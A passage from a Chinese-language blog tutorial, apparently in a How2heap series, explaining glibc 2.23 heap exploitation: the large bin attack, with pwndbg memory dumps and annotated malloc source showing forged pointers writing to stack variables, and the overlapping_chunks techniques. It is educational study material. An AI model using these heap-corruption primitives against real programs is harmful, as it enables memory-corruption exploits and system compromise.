x/<span class="hljs-number">8</span>gx p1<span class="hljs-number">-6</span><br><span class="hljs-number">0x8006fe0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8006ff0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000431</span> &lt;-- p1<br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-6</span><br><span class="hljs-number">0x8007440</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007450</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3<span class="hljs-number">-6</span><br><span class="hljs-number">0x8007980</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007990</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80079a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p3<br><span class="hljs-number">0x80079b0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3+(<span class="hljs-number">0x510</span>/<span class="hljs-number">8</span>)<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007eb0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000020151</span>  &lt;-- top<br><span class="hljs-number">0x8007ec0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007ed0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007ee0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>然后依次释放掉 p1 和 p2，这两个 free chunk 将被放入 unsorted bin<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-25.png#clientId=u38185df4-f4d6-4&from=paste&height=426&id=u15aba304&name=image.png&originHeight=852&originWidth=688&originalType=binary&size=355625&status=done&style=none&taskId=u6ad399c3-0c6c-40b5-b103-1c88c38db82&width=344" alt="image.png"><br>内存布局即：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p1<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000431</span>  &lt;-- p1 [be freed]<br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x0000000008007460</span><br><span class="hljs-number">0x8007020</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2 [be freed]<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000008007000</span>      <span class="hljs-number">0x00007fffff3f3b78</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>类似这样<img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622799357459-3e0b24c7-1a0a-4b1d-a824-ac169d300988.png#clientId=u38185df4-f4d6-4&from=paste&height=262&id=u8d85b49e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=906&originalType=binary&size=50371&status=done&style=none&taskId=u3f890383-beb1-48e0-ac59-759732b834b&width=605" alt="image.png"><br>接下来随便 malloc 一个大小为 0x90 的 chunk，则 p1 被切分为两块，一块作为分配的 chunk 返回，剩下的一块继续留在 unsorted bin.（p1 的作用就在这里，如果没有 p1，那么切分的将是 p2）。<br>要注意的是：切割后 p1 的大小是 0x390 &lt; 0x3f0 大小属于 small bin，而 p2 的大小是 0x510 属于 large bin。<br>p2 则被整理回对应的 large bin 链表中：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-26.png#clientId=u38185df4-f4d6-4&from=paste&height=447&id=u84e1fe75&name=image.png&originHeight=893&originWidth=657&originalType=binary&size=654600&status=done&style=none&taskId=u37f8e899-1229-4164-b4f1-edd1e453ddb&width=328.5" alt="image.png"><br>过程如下：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li><li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li><li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li><li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li></ul><p>此时的内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">40</span>gx p1<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>&lt;p1<span class="hljs-number">-2</span> <span class="hljs-number">0x00000000000000a1</span>&lt;-- p1<span class="hljs-number">-1</span><br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x00007fffff3f3f68</span>      <span class="hljs-number">0x00007fffff3f3f68</span><br><span class="hljs-number">0x8007020</span>:      <span class="hljs-number">0x0000000008007000</span>      <span class="hljs-number">0x0000000008007000</span><br><span class="hljs-number">0x8007030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007040</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007050</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007060</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007070</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007080</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007090</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000391</span>  &lt;-- p1<span class="hljs-number">-2</span> [be freed]<br><span class="hljs-number">0x80070b0</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007fffff3f3b78</span>  &lt;-- fd, bk<br><span class="hljs-number">0x80070c0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070d0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070e0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070f0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007100</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007110</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007120</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007130</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2<span class="hljs-number">-2</span> [be freed]<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x00007fffff3f3fa8</span>      <span class="hljs-number">0x00007fffff3f3fa8</span>  &lt;-- fd, bk<br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x0000000008007460</span>  &lt;-- fd_nextsize, bk_nextsize<br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>整理的过程如下所示，需要注意的是 large bins 中 chunk 按 fd 指针的顺序从大到小排列，如果大小相同则按照最近使用顺序排列：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* place chunk in bin */</span><br><br><span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>  &#123;<br>      [ ... ]<br>  &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);<br>    fwd = bck-&gt;fd;<br><br>    <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>        size |= PREV_INUSE;<br>        <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (bck-&gt;bk-&gt;size))<br>          &#123;<br>              [ ... ]<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; fwd-&gt;size)<br>              &#123;<br>                  [ ... ]<br>              &#125;<br><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) fwd-&gt;size)<br>              [ ... ]<br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                victim-&gt;fd_nextsize = fwd;<br>                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                fwd-&gt;bk_nextsize = victim;<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>              &#125;<br>            bck = fwd-&gt;bk;<br>          &#125;<br>      &#125;<br>    <span class="hljs-keyword">else</span><br>      [ ... ]<br>  &#125;<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>又 free 了一个大小为 0x510 的 large bin chunk。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-27.png#clientId=u38185df4-f4d6-4&from=paste&height=93&id=uc5e947d7&name=image.png&originHeight=185&originWidth=1115&originalType=binary&size=223170&status=done&style=none&taskId=u43bf1cde-908a-435d-8a89-7fd4ddddc5e&width=557.5" alt="image.png"><br>也就是说现在 unsorted bin 有两个空闲的 chunk，末尾是大小 0x390 大小的 chunk，第一个是 size 为 0x510 的 chunk。<br>现在，我们分配一个大小小于释放的第一个大块的块。这将把释放的第二个大块移动到 largebin 列表中，使用释放的第一个大块的部分进行分配，并将释放的第一个大块的剩余部分重新插入 unsorted bin 中: [0x80070a0]<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-28.png#clientId=u38185df4-f4d6-4&from=paste&height=625&id=u13e07ab3&name=image.png&originHeight=859&originWidth=672&originalType=binary&size=561185&status=done&style=none&taskId=ucad99ee5-53d8-4874-a74e-dc69d0f7e7e&width=489" alt="image.png"><br>然后我们修改 p2（large bin chunk），修改结果如下：<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-29.png#clientId=u38185df4-f4d6-4&from=paste&height=163&id=u59355196&name=image.png&originHeight=325&originWidth=816&originalType=binary&size=162888&status=done&style=none&taskId=u309e3074-8bf7-412f-9996-95c4dd65a3c&width=408" alt="image.png"><br>此时的内存布局变为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000000003f1</span><br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9c0</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9a8</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-30.png#clientId=u38185df4-f4d6-4&from=paste&height=111&id=u6a033717&name=image.png&originHeight=221&originWidth=829&originalType=binary&size=34972&status=done&style=none&taskId=u06ac7c6d-fd63-4162-939a-ef7769d5588&width=414.5" alt="image.png"><br>进行 malloc(0x90) 操作，此时</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000000003f1</span><br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079a0</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079a0</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3<span class="hljs-number">-2</span><br><span class="hljs-number">0x80079a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span><br><span class="hljs-number">0x80079b0</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x00007ffffffed9c0</span><br><span class="hljs-number">0x80079c0</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x00007ffffffed9a8</span><br><span class="hljs-number">0x80079d0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var1<br><span class="hljs-number">0x7ffffffed9d0</span>: <span class="hljs-number">0x00000000080079a0</span>      <span class="hljs-number">0x00000000080079b0</span><br>pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var2<br><span class="hljs-number">0x7ffffffed9c8</span>: <span class="hljs-number">0x00000000080079a0</span>      <span class="hljs-number">0x00000000080079a0</span><br></code></pre></td></tr></table></figure><p>可以看到，栈上的两个变量也被修改成了 victim，对应的语句分别是 bck-&gt;fd = victim; 和 ictim-&gt;bk_nextsize-&gt;fd_nextsize = victim;。<br>与第一次 malloc(0x90) 过程类似：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（size = 0390），放入 small bin 中，标记该序列的 small bin 有空闲 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（size = 0x510）</li></ul><p>由于这个过程中判断条件 (unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size) 为假，程序将进入 else 分支，<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-31.png#clientId=u38185df4-f4d6-4&from=paste&height=75&id=u596894f8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=840&originalType=binary&size=41189&status=done&style=none&taskId=u714d7b80-03ec-439b-8b48-c860cd2a7df&width=420" alt="image.png"><br>其中 fwd 是 fake p2，victim 是 p3，接着 bck 被赋值为 (&amp;stack_var1 - 2)。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-32.png#clientId=u38185df4-f4d6-4&from=paste&height=66&id=u9b02184b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=131&originWidth=855&originalType=binary&size=43024&status=done&style=none&taskId=uf9af952d-279d-4d9b-9420-9434415605d&width=427.5" alt="image.png"><br><strong>在一个序列的 large bin chunk 中 fd_nextsize 的方向是 size 变小的方向。这个循环的意思是找到一个比当前 fwd 指的 chunk 要大的地址，存入 fwd 中</strong>。<br>由于当前 fwd 的 size 被我们修改过 =0x3f0，所以没有进入循环。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-33.png#clientId=u38185df4-f4d6-4&from=paste&height=62&id=ub93e4540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=123&originWidth=849&originalType=binary&size=40594&status=done&style=none&taskId=u018824df-aecc-4366-845a-e9c3f038d74&width=424.5" alt="image.png"><br>这个原本的意思是把从 unsorted bin 中来的 chunk 插入这个序列中，但是这里没有检查合法性。这里存在这一个利用：<br>之前做的构造，把 fwd 的 bk_nextsize 指向了另一个地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize<br><span class="hljs-comment">// then</span><br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br></code></pre></td></tr></table></figure><p>也就是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addr2-&gt;fd_nextsize = victim;<br><span class="hljs-comment">// 等价于</span><br>*(addr2+<span class="hljs-number">4</span>) = victim;<br></code></pre></td></tr></table></figure><p>所以修改了 stack_var2 的值。<br>接着还存着另外一个利用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bck = fwd-&gt;bk;<br><span class="hljs-comment">// ......</span><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>修改了 stack_var1 的值。至此利用完毕。<br><strong>总结一下利用的条件</strong>：</p><ul><li>可以修改一个 large bin chunk 的 data</li><li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li></ul><h1 id="overlapping-chunks-2-23"><a href="#overlapping-chunks-2-23" class="headerlink" title="overlapping_chunks-2.23"></a>overlapping_chunks-2.23</h1><p>运行调试，在进行过 3 次 malloc 后<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-34.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u0e8f706f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=602&originWidth=1091&originalType=binary&size=733998&status=done&style=none&taskId=u4084056e-68e3-490a-b30e-7de2fdfe0a1&width=545.5" alt="image.png"><br>查看 heap 信息<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-35.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u5f03230f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=572&originalType=binary&size=337493&status=done&style=none&taskId=u73c5c748-0a2b-4343-9486-782c2265e38&width=286" alt="image.png"><br>然后给三个 chunk 赋初值<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-36.png#clientId=u347f053a-7aac-4&from=paste&height=287&id=u4bf7a318&margin=%5Bobject%20Object%5D&name=image.png&originHeight=574&originWidth=1049&originalType=binary&size=657616&status=done&style=none&taskId=u1cf39fd7-f761-4451-813a-cf1434a6e3a&width=524.5" alt="image.png"><br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-37.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u23dad15b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=634&originWidth=1086&originalType=binary&size=790782&status=done&style=none&taskId=u626bb9d4-b66b-42c2-b5c2-89c7ae34f95&width=543" alt="image.png"><br>然后我们 free 掉 p2,<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-38.png#clientId=u347f053a-7aac-4&from=paste&height=467&id=u4b4ea171&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1317&originalType=binary&size=1219380&status=done&style=none&taskId=ub3ae0add-f74d-4bd2-907f-bb40aa2f23e&width=658.5" alt="image.png"><br>发现它被加入到 unsortedbin 链表中<br>现在让我们模拟一个可以改写 p2.size 的溢出。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-39.png#clientId=u347f053a-7aac-4&from=paste&height=195&id=u4a17cb7e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=389&originWidth=1183&originalType=binary&size=296512&status=done&style=none&taskId=u21b36095-9ef1-43aa-8f8c-4ff6d145fa7&width=591.5" alt="image.png"><br>对于我们这个例子来讲三个标志位影响不是很大，但是为了保持堆的稳定性，还是不要随意改动。<br>至少我们要确保 pre_in_use 为 true，不要让 p1 被误认为被 free 了。<br>我们将 p2 的 size 改写为 0x181，之后的 malloc 就会返回给我们一个 0x178（可使用大小）的堆块。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-40.png#clientId=u347f053a-7aac-4&from=paste&height=447&id=u465f6ccd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=893&originWidth=1307&originalType=binary&size=1031294&status=done&style=none&taskId=ud4c7216b-d77c-4f1d-a866-aeadd12ac7a&width=653.5" alt="image.png"><br>返回给 p4 的地址就是原来 p2 的，而且 p4 中包含了还没被 free 的 p3。<br><img src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-41.png#clientId=u347f053a-7aac-4&from=paste&height=397&id=u874ea1cc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=793&originWidth=1141&originalType=binary&size=553464&status=done&style=none&taskId=ucd76f966-66ff-412b-910e-f7793e9b391&width=570.5" alt="image.png"><br>能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。<br>在 ptmalloc 中，获取 chunk 块大小的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure><p>即使用当前块指针加上当前块大小。在 ptmalloc 中，获取前一个 chunk 信息的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。<br>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure><p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。<br>简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。<br>​</p><h1 id="overlapping-chunks-2-2-23"><a href="#overlapping-chunks-2-2-23" class="headerlink" title="overlapping_chunks_2-2.23"></a>overlapping_chunks_2-2.23</h1><p>这是一个简单的堆块重叠问题。<br>也被称为非相邻 free chunk 合并攻击。<br>首先 malloc 五个堆块：<br><img 